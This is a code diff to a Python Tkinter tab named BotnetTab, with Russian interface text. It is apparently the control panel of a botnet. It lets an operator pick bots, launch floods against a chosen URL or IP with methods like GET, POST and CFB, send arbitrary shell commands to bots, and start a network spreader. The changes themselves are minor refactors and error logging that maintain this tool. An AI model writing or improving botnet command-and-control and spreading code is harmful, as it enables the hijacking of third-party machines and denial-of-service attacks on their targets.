@@ -1,6 +1,6 @@
 import tkinter as tk
 from tkinter import ttk, messagebox, scrolledtext, simpledialog
-import threading, socket, json, time, subprocess, os
+import threading, socket, json, time, subprocess, os, traceback
 
 class BotnetTab(ttk.Frame):
     def __init__(self, parent, app=None):
@@ -59,8 +59,7 @@ class BotnetTab(ttk.Frame):
         self.spin_count.pack(side=tk.LEFT, padx=5)
 
         self.local_var = tk.BooleanVar()
-        self.check_local = ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed)
-        self.check_local.pack(side=tk.LEFT, padx=10)
+        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
 
         self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
         self.btn_start_spread.pack(side=tk.LEFT, padx=10)
@@ -137,9 +136,7 @@ class BotnetTab(ttk.Frame):
 
     def launch_attack(self):
         selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
+        if not selected: return
         target = simpledialog.askstring("Цель", "URL/IP цели:")
         if not target: return
         method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
@@ -165,9 +162,7 @@ class BotnetTab(ttk.Frame):
         cmd = self.cmd_entry.get().strip()
         if not cmd: return
         selected = self.tree.selection()
-        if not selected:
-            messagebox.showwarning("Ошибка", "Выберите ботов")
-            return
+        if not selected: return
         ips = [self.tree.item(i, "values")[0] for i in selected]
         for ip in ips:
             self._send_raw(f"exec:{ip}:{cmd}")
@@ -195,13 +190,12 @@ class BotnetTab(ttk.Frame):
             else:
                 cmd += ["--count", str(count)]
             self.spreader_process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
             )
             self.btn_start_spread.config(text="Остановить спредер")
             for line in iter(self.spreader_process.stdout.readline, ''):
                 self.spread_log.insert(tk.END, line)
                 self.spread_log.see(tk.END)
         except Exception as e:
-            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
+            self.spread_log.insert(tk.END, f"[!] Исключение при запуске:\n{traceback.format_exc()}\n")
             self.btn_start_spread.config(text="Запустить спредер")
